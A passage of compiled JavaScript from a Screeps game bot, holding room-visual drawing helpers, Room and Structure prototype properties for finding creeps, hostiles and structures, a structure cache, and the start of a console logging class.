    [-1, 0],
    [-1, -1]
];
RoomVisual.prototype.connectRoads = function (opts = {}) {
    _.defaults(opts, { opacity: 0.5 });
    const color = opts.color || colors.road || 'white';
    if (!this.roads)
        return;
    // this.text(this.roads.map(r=>r.join(',')).join(' '),25,23)
    this.roads.forEach((r) => {
        // this.text(`${r[0]},${r[1]}`,r[0],r[1],{ size: 0.2 })
        for (let i = 1; i <= 4; i++) {
            const d = dirs[i];
            const c = [r[0] + d[0], r[1] + d[1]];
            const rd = _.some(this.roads, r => r[0] == c[0] && r[1] == c[1]);
            // this.text(`${c[0]},${c[1]}`,c[0],c[1],{ size: 0.2, color: rd?'green':'red' })
            if (rd) {
                this.line(r[0], r[1], c[0], c[1], {
                    color: color,
                    width: 0.35,
                    opacity: opts.opacity
                });
            }
        }
    });
    return this;
};
RoomVisual.prototype.speech = function (text, x, y, opts = {}) {
    const background = !!opts.background ? opts.background : colors.speechBackground;
    const textcolor = !!opts.textcolor ? opts.textcolor : colors.speechText;
    // noinspection PointlessBooleanExpressionJS
    const textstyle = !!opts.textstyle ? opts.textstyle : false;
    const textsize = !!opts.textsize ? opts.textsize : speechSize;
    const textfont = !!opts.textfont ? opts.textfont : speechFont;
    const opacity = !!opts.opacity ? opts.opacity : 1;
    let fontstring = '';
    if (textstyle) {
        fontstring = textstyle + ' ';
    }
    fontstring += textsize + ' ' + textfont;
    let pointer = [
        [-0.2, -0.8],
        [0.2, -0.8],
        [0, -0.3]
    ];
    pointer = relPoly(x, y, pointer);
    pointer.push(pointer[0]);
    this.poly(pointer, {
        fill: background,
        stroke: background,
        opacity: opacity,
        strokeWidth: 0.0
    });
    this.text(text, x, y - 1, {
        color: textcolor,
        backgroundColor: background,
        backgroundPadding: 0.1,
        opacity: opacity,
        font: fontstring
    });
    return this;
};
RoomVisual.prototype.animatedPosition = function (x, y, opts = {}) {
    const color = !!opts.color ? opts.color : 'blue';
    const opacity = !!opts.opacity ? opts.opacity : 0.5;
    let radius = !!opts.radius ? opts.radius : 0.75;
    const frames = !!opts.frames ? opts.frames : 6;
    const angle = (Game.time % frames * 90 / frames) * (Math.PI / 180);
    const s = Math.sin(angle);
    const c = Math.cos(angle);
    const sizeMod = Math.abs(Game.time % frames - frames / 2) / 10;
    radius += radius * sizeMod;
    const points = [
        rotate(0, -radius, s, c, x, y),
        rotate(radius, 0, s, c, x, y),
        rotate(0, radius, s, c, x, y),
        rotate(-radius, 0, s, c, x, y),
        rotate(0, -radius, s, c, x, y),
    ];
    this.poly(points, { stroke: color, opacity: opacity });
    return this;
};
function rotate(x, y, s, c, px, py) {
    const xDelta = x * c - y * s;
    const yDelta = x * s + y * c;
    return { x: px + xDelta, y: py + yDelta };
}
function relPoly(x, y, poly) {
    return poly.map(p => {
        p[0] += x;
        p[1] += y;
        return p;
    });
}
RoomVisual.prototype.test = function () {
    const demopos = [19, 24];
    this.clear();
    this.structure(demopos[0] + 0, demopos[1] + 0, STRUCTURE_LAB);
    this.structure(demopos[0] + 1, demopos[1] + 1, STRUCTURE_TOWER);
    this.structure(demopos[0] + 2, demopos[1] + 0, STRUCTURE_LINK);
    this.structure(demopos[0] + 3, demopos[1] + 1, STRUCTURE_TERMINAL);
    this.structure(demopos[0] + 4, demopos[1] + 0, STRUCTURE_EXTENSION);
    this.structure(demopos[0] + 5, demopos[1] + 1, STRUCTURE_SPAWN);
    this.animatedPosition(demopos[0] + 7, demopos[1]);
    this.speech('This is a test!', demopos[0] + 10, demopos[1], { opacity: 0.7 });
    // this.infoBox(['This is', 'a test', 'mmmmmmmmmmmmm'], demopos[0] + 15, demopos[1]);
    return this;
};
const ColorSets = {
    white: ['#ffffff', '#4c4c4c'],
    grey: ['#b4b4b4', '#4c4c4c'],
    red: ['#ff7b7b', '#592121'],
    yellow: ['#fdd388', '#5d4c2e'],
    green: ['#00f4a2', '#236144'],
    blue: ['#50d7f9', '#006181'],
    purple: ['#a071ff', '#371383'],
};
const ResourceColors = {
    [RESOURCE_ENERGY]: ColorSets.yellow,
    [RESOURCE_POWER]: ColorSets.red,
    [RESOURCE_HYDROGEN]: ColorSets.grey,
    [RESOURCE_OXYGEN]: ColorSets.grey,
    [RESOURCE_UTRIUM]: ColorSets.blue,
    [RESOURCE_LEMERGIUM]: ColorSets.green,
    [RESOURCE_KEANIUM]: ColorSets.purple,
    [RESOURCE_ZYNTHIUM]: ColorSets.yellow,
    [RESOURCE_CATALYST]: ColorSets.red,
    [RESOURCE_GHODIUM]: ColorSets.white,
    [RESOURCE_HYDROXIDE]: ColorSets.grey,
    [RESOURCE_ZYNTHIUM_KEANITE]: ColorSets.grey,
    [RESOURCE_UTRIUM_LEMERGITE]: ColorSets.grey,
    [RESOURCE_UTRIUM_HYDRIDE]: ColorSets.blue,
    [RESOURCE_UTRIUM_OXIDE]: ColorSets.blue,
    [RESOURCE_KEANIUM_HYDRIDE]: ColorSets.purple,
    [RESOURCE_KEANIUM_OXIDE]: ColorSets.purple,
    [RESOURCE_LEMERGIUM_HYDRIDE]: ColorSets.green,
    [RESOURCE_LEMERGIUM_OXIDE]: ColorSets.green,
    [RESOURCE_ZYNTHIUM_HYDRIDE]: ColorSets.yellow,
    [RESOURCE_ZYNTHIUM_OXIDE]: ColorSets.yellow,
    [RESOURCE_GHODIUM_HYDRIDE]: ColorSets.white,
    [RESOURCE_GHODIUM_OXIDE]: ColorSets.white,
    [RESOURCE_UTRIUM_ACID]: ColorSets.blue,
    [RESOURCE_UTRIUM_ALKALIDE]: ColorSets.blue,
    [RESOURCE_KEANIUM_ACID]: ColorSets.purple,
    [RESOURCE_KEANIUM_ALKALIDE]: ColorSets.purple,
    [RESOURCE_LEMERGIUM_ACID]: ColorSets.green,
    [RESOURCE_LEMERGIUM_ALKALIDE]: ColorSets.green,
    [RESOURCE_ZYNTHIUM_ACID]: ColorSets.yellow,
    [RESOURCE_ZYNTHIUM_ALKALIDE]: ColorSets.yellow,
    [RESOURCE_GHODIUM_ACID]: ColorSets.white,
    [RESOURCE_GHODIUM_ALKALIDE]: ColorSets.white,
    [RESOURCE_CATALYZED_UTRIUM_ACID]: ColorSets.blue,
    [RESOURCE_CATALYZED_UTRIUM_ALKALIDE]: ColorSets.blue,
    [RESOURCE_CATALYZED_KEANIUM_ACID]: ColorSets.purple,
    [RESOURCE_CATALYZED_KEANIUM_ALKALIDE]: ColorSets.purple,
    [RESOURCE_CATALYZED_LEMERGIUM_ACID]: ColorSets.green,
    [RESOURCE_CATALYZED_LEMERGIUM_ALKALIDE]: ColorSets.green,
    [RESOURCE_CATALYZED_ZYNTHIUM_ACID]: ColorSets.yellow,
    [RESOURCE_CATALYZED_ZYNTHIUM_ALKALIDE]: ColorSets.yellow,
    [RESOURCE_CATALYZED_GHODIUM_ACID]: ColorSets.white,
    [RESOURCE_CATALYZED_GHODIUM_ALKALIDE]: ColorSets.white,
};
RoomVisual.prototype.resource = function (type, x, y, size = 0.25, opacity = 1) {
    if (type == RESOURCE_ENERGY || type == RESOURCE_POWER) {
        this._fluid(type, x, y, size, opacity);
    }
    else if ([RESOURCE_CATALYST, RESOURCE_HYDROGEN, RESOURCE_OXYGEN, RESOURCE_LEMERGIUM, RESOURCE_UTRIUM,
        RESOURCE_ZYNTHIUM, RESOURCE_KEANIUM]
        .includes(type)) {
        this._mineral(type, x, y, size, opacity);
    }
    else if (ResourceColors[type] != undefined) {
        this._compound(type, x, y, size, opacity);
    }
    else {
        return ERR_INVALID_ARGS;
    }
    return OK;
};
RoomVisual.prototype._fluid = function (type, x, y, size = 0.25, opacity = 1) {
    this.circle(x, y, {
        radius: size,
        fill: ResourceColors[type][0],
        opacity: opacity,
    });
    this.text(type[0], x, y - (size * 0.1), {
        font: (size * 1.5),
        color: ResourceColors[type][1],
        backgroundColor: ResourceColors[type][0],
        backgroundPadding: 0,
        opacity: opacity
    });
};
RoomVisual.prototype._mineral = function (type, x, y, size = 0.25, opacity = 1) {
    this.circle(x, y, {
        radius: size,
        fill: ResourceColors[type][0],
        opacity: opacity,
    });
    this.circle(x, y, {
        radius: size * 0.8,
        fill: ResourceColors[type][1],
        opacity: opacity,
    });
    this.text(type, x, y + (size * 0.03), {
        font: 'bold ' + (size * 1.25) + ' arial',
        color: ResourceColors[type][0],
        backgroundColor: ResourceColors[type][1],
        backgroundPadding: 0,
        opacity: opacity
    });
};
RoomVisual.prototype._compound = function (type, x, y, size = 0.25, opacity = 1) {
    const label = type.replace('2', '₂');
    this.text(label, x, y, {
        font: 'bold ' + (size * 1) + ' arial',
        color: ResourceColors[type][1],
        backgroundColor: ResourceColors[type][0],
        backgroundPadding: 0.3 * size,
        opacity: opacity
    });
};

// Room prototypes - commonly used room properties and methods
// Logging =============================================================================================================
Object.defineProperty(Room.prototype, 'print', {
    get() {
        return '<a href="#!/room/' + Game.shard.name + '/' + this.name + '">' + this.name + '</a>';
    },
    configurable: true,
});
// Room properties =====================================================================================================
Object.defineProperty(Room.prototype, 'my', {
    get() {
        return this.controller && this.controller.my;
    },
    configurable: true,
});
Object.defineProperty(Room.prototype, 'isOutpost', {
    get() {
        return Overmind.colonyMap[this.name] != undefined;
    },
    configurable: true,
});
Object.defineProperty(Room.prototype, 'owner', {
    get() {
        return this.controller && this.controller.owner ? this.controller.owner.username : undefined;
    },
    configurable: true,
});
Object.defineProperty(Room.prototype, 'reservedByMe', {
    get() {
        return this.controller && this.controller.reservation && this.controller.reservation.username == MY_USERNAME;
    },
    configurable: true,
});
Object.defineProperty(Room.prototype, 'signedByMe', {
    get() {
        return this.controller && this.controller.sign && this.controller.sign.text == Memory.settings.signature;
    },
    configurable: true,
});
// Room properties: creeps =============================================================================================
// Creeps physically in the room
Object.defineProperty(Room.prototype, 'creeps', {
    get() {
        if (!this._creeps) {
            this._creeps = this.find(FIND_MY_CREEPS);
        }
        return this._creeps;
    },
    configurable: true,
});
// Room properties: hostiles ===========================================================================================
Object.defineProperty(Room.prototype, 'hostiles', {
    get() {
        if (!this._hostiles) {
            this._hostiles = this.find(FIND_HOSTILE_CREEPS);
        }
        return this._hostiles;
    },
    configurable: true,
});
Object.defineProperty(Room.prototype, 'invaders', {
    get() {
        if (!this._invaders) {
            this._invaders = _.filter(this.hostiles, (creep) => creep.owner.username == 'Invader');
        }
        return this._invaders;
    },
    configurable: true,
});
Object.defineProperty(Room.prototype, 'sourceKeepers', {
    get() {
        if (!this._sourceKeepers) {
            this._sourceKeepers = _.filter(this.hostiles, (creep) => creep.owner.username == 'Source Keeper');
        }
        return this._sourceKeepers;
    },
    configurable: true,
});
Object.defineProperty(Room.prototype, 'playerHostiles', {
    get() {
        if (!this._playerHostiles) {
            this._playerHostiles = _.filter(this.hostiles, (creep) => creep.owner.username != 'Invader'
                && creep.owner.username != 'Source Keeper');
        }
        return this._playerHostiles;
    },
    configurable: true,
});
Object.defineProperty(Room.prototype, 'dangerousHostiles', {
    get() {
        if (!this._dangerousHostiles) {
            if (this.my) {
                this._dangerousHostiles = _.filter(this.hostiles, (creep) => creep.getActiveBodyparts(ATTACK) > 0
                    || creep.getActiveBodyparts(WORK) > 0
                    || creep.getActiveBodyparts(RANGED_ATTACK) > 0
                    || creep.getActiveBodyparts(HEAL) > 0);
            }
            else {
                this._dangerousHostiles = _.filter(this.hostiles, (creep) => creep.getActiveBodyparts(ATTACK) > 0
                    || creep.getActiveBodyparts(RANGED_ATTACK) > 0
                    || creep.getActiveBodyparts(HEAL) > 0);
            }
        }
        return this._dangerousHostiles;
    },
    configurable: true,
});
Object.defineProperty(Room.prototype, 'dangerousPlayerHostiles', {
    get() {
        if (!this._dangerousPlayerHostiles) {
            this._dangerousPlayerHostiles = _.filter(this.playerHostiles, (c) => c.getActiveBodyparts(ATTACK) > 0
                || c.getActiveBodyparts(WORK) > 0
                || c.getActiveBodyparts(RANGED_ATTACK) > 0
                || c.getActiveBodyparts(HEAL) > 0);
        }
        return this._dangerousPlayerHostiles;
    },
    configurable: true,
});
Object.defineProperty(Room.prototype, 'fleeDefaults', {
    get() {
        if (!this._fleeDefaults) {
            this._fleeDefaults = []
                .concat(_.filter(this.hostiles, (c) => c.getActiveBodyparts(ATTACK) > 0
                || c.getActiveBodyparts(RANGED_ATTACK) > 0))
                .concat(_.filter(this.keeperLairs, (l) => (l.ticksToSpawn || Infinity) <= 10));
        }
        return this._fleeDefaults;
    },
    configurable: true,
});
// Hostile structures currently in the room
Object.defineProperty(Room.prototype, 'structures', {
    get() {
        if (!this._allStructures) {
            this._allStructures = this.find(FIND_STRUCTURES);
        }
        return this._allStructures;
    },
    configurable: true,
});
// Hostile structures currently in the room
Object.defineProperty(Room.prototype, 'hostileStructures', {
    get() {
        if (!this._hostileStructures) {
            this._hostileStructures = this.find(FIND_HOSTILE_STRUCTURES, { filter: (s) => s.hitsMax });
        }
        return this._hostileStructures;
    },
    configurable: true,
});
// Room properties: flags ==============================================================================================
// Flags physically in this room
Object.defineProperty(Room.prototype, 'flags', {
    get() {
        if (!this._flags) {
            this._flags = this.find(FIND_FLAGS);
        }
        return this._flags;
    },
    configurable: true,
});
// Room properties: structures =========================================================================================
Object.defineProperty(Room.prototype, 'constructionSites', {
    get() {
        if (!this._constructionSites) {
            this._constructionSites = this.find(FIND_MY_CONSTRUCTION_SITES);
        }
        return this._constructionSites;
    },
    configurable: true,
});
Object.defineProperty(Room.prototype, 'tombstones', {
    get() {
        if (!this._tombstones) {
            this._tombstones = this.find(FIND_TOMBSTONES);
        }
        return this._tombstones;
    },
    configurable: true,
});
Object.defineProperty(Room.prototype, 'drops', {
    get() {
        if (!this._drops) {
            this._drops = _.groupBy(this.find(FIND_DROPPED_RESOURCES), (r) => r.resourceType);
        }
        return this._drops;
    },
    configurable: true,
});
Object.defineProperty(Room.prototype, 'droppedEnergy', {
    get() {
        return this.drops[RESOURCE_ENERGY] || [];
    },
    configurable: true,
});
Object.defineProperty(Room.prototype, 'droppedPower', {
    get() {
        return this.drops[RESOURCE_POWER] || [];
    },
    configurable: true,
});

// Intra- and inter-tick structure caching, adapted from semperRabbit's IVM module
const roomStructureIDs = {};
const roomStructuresExpiration = {};
const multipleList = [
    STRUCTURE_SPAWN, STRUCTURE_EXTENSION, STRUCTURE_ROAD, STRUCTURE_WALL,
    STRUCTURE_RAMPART, STRUCTURE_KEEPER_LAIR, STRUCTURE_PORTAL, STRUCTURE_LINK,
    STRUCTURE_TOWER, STRUCTURE_LAB, STRUCTURE_CONTAINER, STRUCTURE_POWER_BANK,
];
const singleList = [
    STRUCTURE_OBSERVER, STRUCTURE_POWER_SPAWN, STRUCTURE_EXTRACTOR, STRUCTURE_NUKER,
];
const notRepairable = [STRUCTURE_KEEPER_LAIR, STRUCTURE_PORTAL, STRUCTURE_POWER_BANK];
const STRUCTURE_TIMEOUT = onPublicServer() ? 50 : 10;
Room.prototype._refreshStructureCache = function () {
    // if cache is expired or doesn't exist
    if (!roomStructuresExpiration[this.name]
        || !roomStructureIDs[this.name]
        || Game.time > roomStructuresExpiration[this.name]) {
        roomStructuresExpiration[this.name] = getCacheExpiration(STRUCTURE_TIMEOUT);
        roomStructureIDs[this.name] = _.mapValues(_.groupBy(this.find(FIND_STRUCTURES), (s) => s.structureType), (structures) => _.map(structures, s => s.id));
    }
};
multipleList.forEach(function (type) {
    Object.defineProperty(Room.prototype, type + 's', {
        get: function () {
            if (this['_' + type + 's']) {
                return this['_' + type + 's'];
            }
            else {
                this._refreshStructureCache();
                if (roomStructureIDs[this.name][type]) {
                    return this['_' + type + 's'] = _.compact(_.map(roomStructureIDs[this.name][type], Game.getObjectById));
                }
                else {
                    return this['_' + type + 's'] = [];
                }
            }
        },
        configurable: true,
    });
});
singleList.forEach(function (type) {
    Object.defineProperty(Room.prototype, type, {
        get: function () {
            if (this['_' + type]) {
                return this['_' + type];
            }
            else {
                this._refreshStructureCache();
                if (roomStructureIDs[this.name][type]) {
                    return this['_' + type] = Game.getObjectById(roomStructureIDs[this.name][type][0]);
                }
                else {
                    return this['_' + type] = undefined;
                }
            }
        },
        configurable: true,
    });
});
Object.defineProperty(Room.prototype, 'storageUnits', {
    get() {
        if (!this._storageUnits) {
            this._storageUnits = _.compact([this.storage, this.terminal]).concat(this.containers);
        }
        return this._storageUnits;
    },
    configurable: true,
});
Object.defineProperty(Room.prototype, 'sources', {
    get() {
        if (!this._sources) {
            this._sources = this.find(FIND_SOURCES);
        }
        return this.find(FIND_SOURCES);
    },
    configurable: true,
});
Object.defineProperty(Room.prototype, 'mineral', {
    get() {
        if (!this._mineral) {
            this._mineral = this.find(FIND_MINERALS)[0];
        }
        return this._mineral;
    },
    configurable: true,
});
Object.defineProperty(Room.prototype, 'repairables', {
    get() {
        if (!this._repairables) {
            this._refreshStructureCache();
            if (roomStructureIDs[this.name].repairables) {
                return this._repairables = _.compact(_.map(roomStructureIDs[this.name].repairables, Game.getObjectById));
            }
            else {
                let repairables = [];
                for (const structureType of singleList) {
                    if (this[structureType]) {
                        repairables.push(this[structureType]);
                    }
                }
                for (const structureType of multipleList) {
                    if (structureType != STRUCTURE_WALL &&
                        structureType != STRUCTURE_RAMPART &&
                        structureType != STRUCTURE_ROAD &&
                        !notRepairable.includes(structureType)) {
                        repairables = repairables.concat(this[structureType + 's']);
                    }
                }
                roomStructureIDs[this.name].repairables = _.map(repairables, s => s.id);
                return this._repairables = repairables;
            }
        }
        return this._repairables;
    },
    configurable: true,
});
Object.defineProperty(Room.prototype, 'walkableRamparts', {
    get() {
        if (!this._walkableRamparts) {
            this._refreshStructureCache();
            if (roomStructureIDs[this.name].walkableRamparts) {
                return this._walkableRamparts = _.compact(_.map(roomStructureIDs[this.name].walkableRamparts, Game.getObjectById));
            }
            else {
                const walkableRamparts = _.filter(this.ramparts, (r) => r.pos.isWalkable(true));
                roomStructureIDs[this.name].walkableRamparts = _.map(walkableRamparts, r => r.id);
                return this._walkableRamparts = walkableRamparts;
            }
        }
        return this._walkableRamparts;
    },
    configurable: true,
});
Object.defineProperty(Room.prototype, 'rechargeables', {
    get() {
        if (!this._rechargeables) {
            this._rechargeables = [...this.storageUnits,
                ...this.droppedEnergy,
                ...this.tombstones];
        }
        return this._rechargeables;
    },
    configurable: true,
});
Object.defineProperty(Room.prototype, 'barriers', {
    get() {
        if (!this._barriers) {
            this._barriers = [].concat(this.ramparts, this.constructedWalls);
        }
        return this._barriers;
    },
    configurable: true,
});
Object.defineProperty(Room.prototype, 'walls', {
    get() {
        return this.constructedWalls;
    },
    configurable: true,
});

// All structure prototypes
Object.defineProperty(Structure.prototype, 'isWalkable', {
    get() {
        return this.structureType == STRUCTURE_ROAD ||
            this.structureType == STRUCTURE_CONTAINER ||
            (this.structureType == STRUCTURE_RAMPART && (this.my ||
                this.isPublic));
    },
    configurable: true,
});
// Container prototypes ================================================================================================
Object.defineProperty(StructureContainer.prototype, 'energy', {
    get() {
        return this.store[RESOURCE_ENERGY];
    },
    configurable: true,
});
Object.defineProperty(StructureContainer.prototype, 'isFull', {
    get() {
        return _.sum(this.store) >= this.storeCapacity;
    },
    configurable: true,
});
Object.defineProperty(StructureContainer.prototype, 'isEmpty', {
    get() {
        return _.sum(this.store) == 0;
    },
    configurable: true,
});
// Controller prototypes ===============================================================================================
Object.defineProperty(StructureController.prototype, 'reservedByMe', {
    get: function () {
        return this.reservation && this.reservation.username == MY_USERNAME;
    },
    configurable: true,
});
Object.defineProperty(StructureController.prototype, 'signedByMe', {
    get: function () {
        return this.sign && this.sign.text == Memory.settings.signature && Game.time - this.sign.time < 250000;
    },
    configurable: true,
});
Object.defineProperty(StructureController.prototype, 'signedByScreeps', {
    get: function () {
        return this.sign && this.sign.username == 'Screeps';
    },
    configurable: true,
});
StructureController.prototype.needsReserving = function (reserveBuffer) {
    return !this.reservation || (this.reservedByMe && this.reservation.ticksToEnd < reserveBuffer);
};
// Extension prototypes ================================================================================================
Object.defineProperty(StructureExtension.prototype, 'isFull', {
    get() {
        return this.energy >= this.energyCapacity;
    },
    configurable: true,
});
Object.defineProperty(StructureExtension.prototype, 'isEmpty', {
    get() {
        return this.energy == 0;
    },
    configurable: true,
});
// Link prototypes =====================================================================================================
Object.defineProperty(StructureLink.prototype, 'isFull', {
    get() {
        return this.energy >= this.energyCapacity;
    },
    configurable: true,
});
Object.defineProperty(StructureLink.prototype, 'isEmpty', {
    get() {
        return this.energy == 0;
    },
    configurable: true,
});
// Nuker prototypes ====================================================================================================
// PowerSpawn prototypes ===============================================================================================
// Spawn prototypes ====================================================================================================
Object.defineProperty(StructureSpawn.prototype, 'isFull', {
    get() {
        return this.energy >= this.energyCapacity;
    },
    configurable: true,
});
Object.defineProperty(StructureSpawn.prototype, 'isEmpty', {
    get() {
        return this.energy == 0;
    },
    configurable: true,
});
// Storage prototypes ==================================================================================================
Object.defineProperty(StructureStorage.prototype, 'energy', {
    get() {
        return this.store[RESOURCE_ENERGY];
    },
    configurable: true,
});
Object.defineProperty(StructureStorage.prototype, 'isFull', {
    get() {
        return _.sum(this.store) >= this.storeCapacity;
    },
    configurable: true,
});
Object.defineProperty(StructureStorage.prototype, 'isEmpty', {
    get() {
        return _.sum(this.store) == 0;
    },
    configurable: true,
});
// Terminal prototypes =================================================================================================
Object.defineProperty(StructureTerminal.prototype, 'energy', {
    get() {
        return this.store[RESOURCE_ENERGY];
    },
    configurable: true,
});
Object.defineProperty(StructureTerminal.prototype, 'isFull', {
    get() {
        return _.sum(this.store) >= this.storeCapacity;
    },
    configurable: true,
});
Object.defineProperty(StructureTerminal.prototype, 'isEmpty', {
    get() {
        return _.sum(this.store) == 0;
    },
    configurable: true,
});
// StructureTerminal.prototype._send = StructureTerminal.prototype.send;
// StructureTerminal.prototype.send = function(resourceType: ResourceConstant, amount: number, destination: string,
//                                          description?: string): ScreepsReturnCode {
//  // Log stats
//  let origin = this.room.name;
//  let response = this._send(resourceType, amount, destination, description);
//  if (response == OK) {
//      TerminalNetwork.logTransfer(resourceType,amount,origin, destination)
//  }
//  return response;
// };
// Tower prototypes
Object.defineProperty(StructureTower.prototype, 'isFull', {
    get() {
        return this.energy >= this.energyCapacity;
    },
    configurable: true,
});
Object.defineProperty(StructureTower.prototype, 'isEmpty', {
    get() {
        return this.energy == 0;
    },
    configurable: true,
});
// Tombstone prototypes ================================================================================================
Object.defineProperty(Tombstone.prototype, 'energy', {
    get() {
        return this.store[RESOURCE_ENERGY];
    },
    configurable: true,
});

"use strict";
String.prototype.padRight = function (length, char = ' ') {
    return this + char.repeat(Math.max(length - this.length, 0));
};
String.prototype.padLeft = function (length, char = ' ') {
    return char.repeat(Math.max(length - this.length, 0)) + this;
};
Number.prototype.toPercent = function (decimals = 0) {
    return (this * 100).toFixed(decimals) + '%';
};
Number.prototype.truncate = function (decimals) {
    const re = new RegExp('(\\d+\\.\\d{' + decimals + '})(\\d)'), m = this.toString().match(re);
    return m ? parseFloat(m[1]) : this.valueOf();
};
Object.defineProperty(ConstructionSite.prototype, 'isWalkable', {
    get() {
        return this.structureType == STRUCTURE_ROAD ||
            this.structureType == STRUCTURE_CONTAINER ||
            this.structureType == STRUCTURE_RAMPART;
    },
    configurable: true,
});

var Log_1;
var LogLevels;
(function (LogLevels) {
    LogLevels[LogLevels["ERROR"] = 0] = "ERROR";
    LogLevels[LogLevels["WARNING"] = 1] = "WARNING";
    LogLevels[LogLevels["ALERT"] = 2] = "ALERT";
    LogLevels[LogLevels["INFO"] = 3] = "INFO";
    LogLevels[LogLevels["DEBUG"] = 4] = "DEBUG"; // log.level = 4
})(LogLevels || (LogLevels = {}));
/**
 * Default debug level for log output
 */
const LOG_LEVEL = LogLevels.INFO;
/**
 * Prepend log output with current tick number.
 */
const LOG_PRINT_TICK = true;
/**
 * Prepend log output with source line.
 */
const LOG_PRINT_LINES = false;
/**
 * Load source maps and resolve source lines back to typeascript.
 */
const LOG_LOAD_SOURCE_MAP = false;
/**
 * Maximum padding for source links (for aligning log output).
 */
const LOG_MAX_PAD = 100;
/**
 * VSC location, used to create links back to source.
 * Repo and revision are filled in at build time for git repositories.
 */
const LOG_VSC = { repo: '@@_repo_@@', revision: '@@_revision_@@', valid: false };
// export const LOG_VSC = { repo: "@@_repo_@@", revision: __REVISION__, valid: false };
/**
 * URL template for VSC links, this one works for github and gitlab.
 */
const LOG_VSC_URL_TEMPLATE = (path, line) => {
    return `${LOG_VSC.repo}/blob/${LOG_VSC.revision}/${path}#${line}`;
};
// <caller> (<source>:<line>:<column>)
const stackLineRe = /([^ ]*) \(([^:]*):([0-9]*):([0-9]*)\)/;
const FATAL = -1;
const fatalColor = '#d65156';
function resolve(fileLine) {
    const split = _.trim(fileLine).match(stackLineRe);
    if (!split || !Log.sourceMap) {
        return { compiled: fileLine, final: fileLine };
    }
    const pos = { column: parseInt(split[4], 10), line: parseInt(split[3], 10) };
    const original = Log.sourceMap.originalPositionFor(pos);
    const line = `${split[1]} (${original.source}:${original.line})`;
    const out = {
        caller: split[1],
        compiled: fileLine,
        final: line,
        line: original.line,
        original: line,
        path: original.source,
    };
    return out;
}
function makeVSCLink(pos) {
    if (!LOG_VSC.valid || !pos.caller || !pos.path || !pos.line || !pos.original) {
        return pos.final;
    }
    return link(vscUrl(pos.path, `L${pos.line.toString()}`), pos.original);
}
function tooltip(str, tooltip) {
    return `<abbr title='${tooltip}'>${str}</abbr>`;
}
function vscUrl(path, line) {
    return LOG_VSC_URL_TEMPLATE(path, line);
}
function link(href, title) {
    return `<a href='${href}' target="_blank">${title}</a>`;
}
function time() {
    return color(Game.time.toString(), 'gray');
}
function debug(thing, ...args) {
    if (thing.memory && thing.memory.debug) {
        this.debug(`${thing.name} @ ${thing.pos.print}: `, args);
    }
}
/**
 * Log provides methods for displaying pretty-printed text into the Screeps console
 */
let Log = Log_1 = class Log {
    constructor() {
        this._maxFileString = 0;
        _.defaultsDeep(Memory, {
            settings: {
                log: {
                    level: LOG_LEVEL,
                    showSource: LOG_PRINT_LINES,
                    showTick: LOG_PRINT_TICK,
                }
            }
        });
    }
    static loadSourceMap() {
        // try {
        //  // tslint:disable-next-line
        //  const map = require('main.js.map');
        //  if (map) {
        //      Log.sourceMap = new SourceMapConsumer(map);
        //  }
        // } catch (err) {
        console.log('Source mapping deprecated.');
        // }
    }
    get level() {
        return Memory.settings.log.level;
    }
    setLogLevel(value) {
        let changeValue = true;
        switch (value) {
            case LogLevels.ERROR:
                console.log(`Logging level set to ${value}. Displaying: ERROR.`);
                break;
            case LogLevels.WARNING:
                console.log(`Logging level set to ${value}. Displaying: ERROR, WARNING.`);
                break;
            case LogLevels.ALERT:
                console.log(`Logging level set to ${value}. Displaying: ERROR, WARNING, ALERT.`);
                break;
            case LogLevels.INFO:
                console.log(`Logging level set to ${value}. Displaying: ERROR, WARNING, ALERT, INFO.`);
                break;
            case LogLevels.DEBUG:
                console.log(`Logging level set to ${value}. Displaying: ERROR, WARNING, ALERT, INFO, DEBUG.`);
                break;
            default:
                console.log(`Invalid input: ${value}. Loging level can be set to integers between `
                    + LogLevels.ERROR + ' and ' + LogLevels.DEBUG + ', inclusive.');
                changeValue = false;
                break;
        }
        if (changeValue) {
            Memory.settings.log.level = value;
        }
    }
    get showSource() {
        return Memory.settings.log.showSource;
    }
    set showSource(value) {
        Memory.settings.log.showSource = value;
    }
    get showTick() {
        return Memory.settings.log.showTick;
    }
    set showTick(value) {
        Memory.settings.log.showTick = value;
    }
    trace(error) {
        if (this.level >= LogLevels.ERROR && error.stack) {
            console.log(this.resolveStack(error.stack));
        }
        return this;
    }
    throw(e) {
        console.log.apply(this, this.buildArguments(FATAL).concat([color(e.toString(), fatalColor)]));
    }
    error(...args) {
        if (this.level >= LogLevels.ERROR) {
            console.log.apply(this, this.buildArguments(LogLevels.ERROR).concat([].slice.call(args)));
        }
        return undefined;
    }
    warning(...args) {
        if (this.level >= LogLevels.WARNING) {
            console.log.apply(this, this.buildArguments(LogLevels.WARNING).concat([].slice.call(args)));
        }
        return undefined;
    }
    alert(...args) {
        if (this.level >= LogLevels.ALERT) {
            console.log.apply(this, this.buildArguments(LogLevels.ALERT).concat([].slice.call(args)));
        }
        return undefined;
    }
    notify(message) {
        this.alert(message);
        Game.notify(message);
        return undefined;
    }
    info(...args) {
        if (this.level >= LogLevels.INFO) {
            console.log.apply(this, this.buildArguments(LogLevels.INFO).concat([].slice.call(args)));
        }
        return undefined;
    }
    debug(...args) {
        if (this.level >= LogLevels.DEBUG) {
            console.log.apply(this, this.buildArguments(LogLevels.DEBUG).concat([].slice.call(args)));
        }
    }
    debugCreep(creep, ...args) {
        if (creep.memory && creep.memory.debug) {
            this.debug(`${creep.name} @ ${creep.pos.print}: `, args);
        }
    }
    printObject(obj) {
        console.log.apply(this, this.buildArguments(LogLevels.DEBUG).concat(JSON.stringify(obj)));
    }
    getFileLine(upStack = 4) {
        const stack = new Error('').stack;
        if (stack) {
            const lines = stack.split('\n');
            if (lines.length > upStack) {
                const originalLines = _.drop(lines, upStack).map(resolve);
                const hoverText = _.map(originalLines, 'final').join('&#10;');
                return this.adjustFileLine(originalLines[0].final, tooltip(makeVSCLink(originalLines[0]), hoverText));
            }
        }
        return '';
    }
    buildArguments(level) {
        const out = [];
        switch (level) {
            case LogLevels.ERROR:
                out.push(color('ERROR  ', 'red'));
                break;
            case LogLevels.WARNING:
                out.push(color('WARNING', 'orange'));
                break;
            case LogLevels.ALERT:
                out.push(color('ALERT  ', 'yellow'));
                break;
            case LogLevels.INFO:
                out.push(color('INFO   ', 'green'));
                break;
            case LogLevels.DEBUG:
                out.push(color('DEBUG  ', 'gray'));
                break;
            case FATAL:
                out.push(color('FATAL  ', fatalColor));
                break;
            default:
                break;
        }
        if (this.showTick) {
            out.push(time());
        }
        if (this.showSource && level <= LogLevels.ERROR) {
            out.push(this.getFileLine());
